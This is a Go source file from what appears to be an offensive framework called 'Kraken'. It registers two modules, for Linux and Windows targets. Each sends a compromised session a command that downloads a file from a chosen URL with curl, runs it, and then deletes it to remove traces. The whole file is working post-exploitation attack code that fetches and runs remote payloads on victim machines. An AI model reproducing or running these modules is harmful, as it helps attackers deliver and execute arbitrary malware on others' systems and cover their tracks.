package ExploitDaB

import (
	"framework/kraken/Kraken/Public"
	"strings"
)

func LoadExploits() {
	TmpFileFromUrl := func(url string) string {
		return strings.Split(url, "/")[len(strings.Split(url, "/"))-1]
	}
	ExploitDB = append(ExploitDB, Exploit{
		Pname: "exploit/linux/eurl",
		Execute: func() {
			var tmp_file string = TmpFileFromUrl(Public.GetGlobalOrPirvate("url"))
			var exploit string = "curl " + Public.GetGlobalOrPirvate("url") + " -o " + tmp_file + "; chmod +x " + tmp_file + "; ./" + tmp_file + "; rm -rf " + tmp_file
			ExecPayload(Public.GetGlobalOrPirvate("session"), exploit)
		},
		Options: []Option{
			{Name: "session", Descr: "Target session."},
			{Name: "url", Descr: "Url to execute file from."},
		},
	})
	ExploitDB = append(ExploitDB, Exploit{
		Pname: "exploit/windows/eurl",
		Execute: func() {
			var tmp_file string = TmpFileFromUrl(Public.GetGlobalOrPirvate("url"))
			var exploit string = "curl " + Public.GetGlobalOrPirvate("url") + " -o " + tmp_file + "; ./" + tmp_file + "; rm -r -fo " + tmp_file
			ExecPayload(Public.GetGlobalOrPirvate("session"), exploit)
		},
		Options: []Option{
			{Name: "session", Descr: "Target session."},
			{Name: "url", Descr: "Url to execute file from."},
		},
	})
}
